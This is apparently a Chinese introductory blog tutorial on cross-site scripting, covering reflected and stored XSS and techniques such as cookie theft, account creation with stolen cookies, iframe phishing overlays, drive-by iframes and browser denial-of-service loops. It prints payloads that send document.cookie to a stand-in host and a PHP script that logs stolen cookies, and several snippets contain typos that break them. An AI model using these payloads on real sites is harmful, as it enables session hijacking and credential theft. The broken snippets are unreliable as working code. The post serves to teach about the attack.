---
title: WEB安全(一) ：XSS初探
date: 2022-06-23 08:22:26
tags:
---

### `郑重提醒：本文仅限于讨论安全技术，请勿用作非法用途，严禁利用本文所提漏洞和技术进行非法攻击，否则后果自负，本人不承担任何责任！`
### `什么是XSS`

> 跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式，  
> XSS是指恶意攻击者`利用`网站没有对用户提交数据进行转义处理或者过滤不足的`缺点`，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

### `XSS的分类`

*   XSS根据特性和入侵手法不同，主要分为两大类型，一种是反射型XSS，一种是持久性XSS

### 反射型xss

> 也成为非持久性xss，这种漏洞攻击是最常见的，使用最多的一种，主要的攻击方式是讲脚本附加到url地址的参数中，如下

```js
https://zhuanlan.zhihu.com/p/54289849/edit.php?key="><script>alert("xss")</script>
```

> 这种一般是利用攻击手法，诱骗用户点击恶意url，一般此类代码只执行一次，所以为反射型xss，

### 持久型xss

> 也叫做存储型xss，一般在进行漏洞攻击时，会吧此类危害存入到数据库中，所以会在用户访问该页面时弹出被入侵的代码，下面列一段简单的存储型xss

```js
<body>
    <!--留言板-->
    <textarea></textarea>
    <button>提交</button>
</body>
```

> 比如上面代码，我们在textarea中输入留言，然后提交到数据库。如果我们按照下面这种方式提交

![](https://pic1.zhimg.com/v2-f058269f7ba9c0e63c198656f2725578_b.jpg)

![](https://pic1.zhimg.com/80/v2-f058269f7ba9c0e63c198656f2725578_1440w.jpg)

> 这样在浏览器输入该留言的时候，代码就会变成下面这样

```js
<body>
    <!--留言板-->
    <textarea></textarea><script>alert('xss')</script><textarea></textarea>
    <button>提交</button>
</body>
```

> 

### `常见的XSS剖析`

> 介绍完xss的分类后，相信大家对xss有一个初步的链接，接下来会介绍一些xss的常见技术，其中涉及一些javascript知识，另外，`常见技术仅用于讨论，请勿用于其他网站`

> `1，cookie窃取`

> 窃取cookie是xss攻击中最常用的方式，因为cookie在很多网站中用于保存会话，比如我们常见的网站，往往在输入密码后，为了避免每次浏览多次输入，会勾上记住密码选项，这样，cookie就会保存在我们本地，

> 由于cookie 从客户端和服务端都可以访问，首先从客户端来讲，输入document.cookie就会弹出cookie的相关信息

> 那么，我们如何窃取cookie？ 假设一个网站存在xss攻击，那么，我们就可以编写恶意代码获取cookie信息

```js
<script>
    document.location = "https://www.xxx.com/xss.php?cookie='document.cookie;
</script>

<img src="https://www.xxx.com/xss.php?cookie='document.cookie" />
```

> php 获取信息 xss.php

```js
<?php
  $cookie = $GET['cookie'];
  $log = fopen('cookie.txt','a');
  fwrite($log, $cookie ."\\n");
  fclose($log)
?>
```

> 这样，在获取到cookie之后，就可以利用一些欺骗工具，然后把cookie复制到受害网站上面，进行登录

> `2，权限提升`

> 权限提升是指当网站有漏洞的时候，我们根据管理员添加人员的信息接口，实现接口拦截，然后增加自己的信息创建代码

> 比如我们的网站添加成员的接口为 /admin/addUser.php

> 提交的post数据为 username=admin&password=123456&cookie=xxxxxx

> 那么，当我们拦截到被攻击者的cookie，我们可以利用ajax发送一个post请求，由于我们的请求带上了被攻击者的cookie，所以能请求成功，在后台添加一个账号。

> `3，xss网络钓鱼`

> 传统的xss钓鱼攻击是通过复制网站，然后利用骗取用户点击假网站链接，然后获取账号密码，虽然这种方式容易麻痹用户，但是由于域名不一样，很多用户还是容易识破

> 当结合xss技术后，hack就可以通过javascript动态控制页面内容

> 我们可以在有漏洞页面插入如下xss

```js
https://www.baidu.com?s=<srcipt src=https://www.xxx.com/xss.js><script>
```

> 当用户访问当前连接，就会调用xss

```js
document.body.innerHTML=(
        '<div style="position: absolute;top:0;left:0;width: 100%;height: 100%">' +
        '<iframe src=https://www.xxx.com/xss.html width=100% height=100%>' +
        '</iframe></div>'
    );
```

> 这样，就会加载iframe，我们在iframe放入密码框，就可以欺骗用户输入。

> `4，网页挂马`

> 网页挂马是指当用户访问一个网页之后，就会被运行了密码程序，然后被入侵电脑，做其他的事情

> 在xss中使用挂马的方式很简单，只要找到有漏洞的网站执行以下代码

```js
<script>
   document.write("<ifream src=http://www.xxx.com/xss.html width=0 height=0></ifream>")
</script>
```

> `5，DOS和DDOS`

> dos指拒绝服务供给，这种攻击指利用大量数据让系统崩溃，考虑以下代码

```js
<script>
   for(;;){
    $.ajax({});
   }
</script>

————————————————————————————分割线————————————————

<meta http-equiv='refresh' content='0'>
```

> 当你保存这段代码为html后，用浏览器打开，分割线上面代码此时会出现无线请求ajax 现象，这样会造成浏览器的死循环。 分割线下面代码则会造成网页无线刷新

> ddos就是指分布式拒绝服务攻击，说简单了就是多台电脑执行dos攻击

> 

### `结尾`

> 以上就是今天给大家带来初探xss的所有内容，说起xss。我也是研究了一周左右，所以很多地方有错误在所难免，而且今天的文章算是一个入门，让大家知道xss的危害，以及执行的方法。
